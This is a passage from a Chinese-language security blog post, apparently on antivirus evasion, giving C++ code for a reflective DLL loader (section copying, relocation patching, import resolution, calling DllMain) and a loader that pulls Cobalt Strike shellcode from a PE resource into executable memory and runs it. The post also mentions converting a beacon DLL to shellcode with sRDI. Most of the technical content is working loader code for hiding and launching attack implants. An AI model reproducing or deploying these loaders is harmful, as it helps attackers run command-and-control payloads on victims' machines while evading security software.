<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DWORD_PTR deltaImageBase &#x3D; (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111102159539.png" alt="image-20201111102159539">    </p>
<p>​    下面的代码将区块表的内容拷贝到分配的内存中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_SECTION_HEADER section &#x3D; IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">for (size_t i &#x3D; 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">	LPVOID sectionDestination &#x3D; (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">	LPVOID sectionBytes &#x3D; (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">	std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">	section++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    下面的代码用来修改pe的重定位表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY relocations &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable &#x3D; relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock &#x3D; (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount &#x3D; (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) &#x2F; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i &#x3D; 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type &#x3D;&#x3D; 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA &#x3D; relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch &#x3D; 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch +&#x3D; deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>​    被注入的DLL可能还依赖于其他的DLL，因此我们还需要装载这些被依赖的DLL，并修改本DLL的引入表，使这些被引入的函数能正常运行。解析导入表，根据IMAGE_IMPORT_DESCRIPTOR中的NAME成员找到DLL的名称，根据名称装载被依赖的DLL,IMAGE_IMPORT_DESCRIPTOR的FirstThunk指向了DLL引入了哪些函数。通过GetProcAddress可以找到函数的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDescriptor &#x3D; NULL;</span><br><span class="line">IMAGE_DATA_DIRECTORY importsDirectory &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">importDescriptor &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">LPCSTR libraryName &#x3D; &quot;&quot;;</span><br><span class="line">HMODULE library &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">while (importDescriptor-&gt;Name !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">	libraryName &#x3D; (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">	library &#x3D; LoadLibraryA(libraryName); </span><br><span class="line"></span><br><span class="line">	if (library)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_THUNK_DATA thunk &#x3D; NULL;</span><br><span class="line">		thunk &#x3D; (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">		while (thunk-&gt;u1.AddressOfData !&#x3D; NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">			&#123;</span><br><span class="line">				LPCSTR functionOrdinal &#x3D; (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">				thunk-&gt;u1.Function &#x3D; (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME functionName &#x3D; (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">				DWORD_PTR functionAddress &#x3D; (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">				thunk-&gt;u1.Function &#x3D; functionAddress;</span><br><span class="line">			&#125;</span><br><span class="line">			++thunk;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	importDescriptor++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过AddressOfEntryPoint找到DLL文件的入口点，最终会执行dllmain函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DLLEntry DllEntry &#x3D; (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br></pre></td></tr></table></figure>

<p>​    由于个人windows基础能力有限，关于上面代码的分析参考<a href="https://www.freebuf.com/articles/others-articles/245305.html" target="_blank" rel="noopener">恶意代码分析之反射型DLL注入</a>、<a href="https://github.com/potats0/PeLoader" target="_blank" rel="noopener">peloader</a>，最后我们再理一下这个过程</p>
<ul>
<li>在堆上分配一块内存，将DLL文件加载到内存</li>
<li>将DLL文件头部放到分配的内存上</li>
<li>将区块表的内容复制到内存</li>
<li>修改重定向表和解析导入表</li>
<li>调用DLL</li>
</ul>
<h2 id="从PE-resource加载shellcode"><a href="#从PE-resource加载shellcode" class="headerlink" title="从PE resource加载shellcode"></a>从PE resource加载shellcode</h2><p>​    使用这种方式可以将shellcode放到资源文件中进行加载，具体操作过程如下：</p>
<p>首先生成一个stagerless的bin文件，我这里使用cobaltstrike来进行生成，生成以后将bin添加到资源文件中</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111171204066.png" alt="image-20201111171204066"></p>
<p>​    选择导入资源，选择我们生成的bin文件，资源类型由我们自己命名</p>
<img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175537339.png" alt="image-20201111175537339" style="zoom:67%;">



<p>​    在头文件中可以看到我们加载的资源文件的标识符。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175617208.png" alt="image-20201111175617208"></p>
<p>​    最后使用如下代码加载资源并进行解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &quot;resource.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode</span><br><span class="line">	&#x2F;&#x2F; METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin</span><br><span class="line">	HRSRC shellcodeResource &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_BEACON1), L&quot;METERPRETER_BIN&quot;);</span><br><span class="line">	DWORD shellcodeSize &#x3D; SizeofResource(NULL, shellcodeResource);</span><br><span class="line">	HGLOBAL shellcodeResouceData &#x3D; LoadResource(NULL, shellcodeResource);</span><br><span class="line"></span><br><span class="line">	void* exec &#x3D; VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcodeResouceData, shellcodeSize);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">	return  0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码首先通过FindResource找到我们想要加载的资源，通过LoadResource加载资源的内容，再通过VirtualAlloc分配一块内存，将资源复制到内存，通过函数指针的方式调用执行shellcode。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111180732544.png" alt="image-20201111180732544"></p>
<p>​    也可以将DLL加载到资源中执行，这个操作需要依赖<a href="https://github.com/monoxgas/sRDI" target="_blank" rel="noopener">sRDI</a></p>
<p>​    首先生成一个dll文件，利用ConvertToShellcode.py将DLL文件转换为bin文件</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111182017884.png" alt="image-20201111182017884"></p>
<p>​    在vs中将生成的beacon.bin文件放到资源中加载，我测试执行并没有成功，但是生成一个messagebox弹窗的dll转换为bin执行是可以的，原因未知。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111193353829.png" alt="image-20201111193353829"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">35</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
